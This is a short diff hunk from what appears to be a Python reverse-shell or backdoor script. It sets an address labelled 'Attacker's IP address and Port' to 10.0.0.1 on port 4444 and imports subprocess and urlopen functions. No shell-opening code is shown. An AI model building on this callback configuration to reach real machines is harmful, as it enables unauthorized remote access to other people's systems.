@@ -3,7 +3,7 @@ from urllib.request import urlopen
 from subprocess import Popen,check_output
 
 # Attacker's IP address and Port
-IP = "192.168.2.109"
+IP = "10.0.0.1"
 PORT = 4444
 
 if sys.platform == "linux":
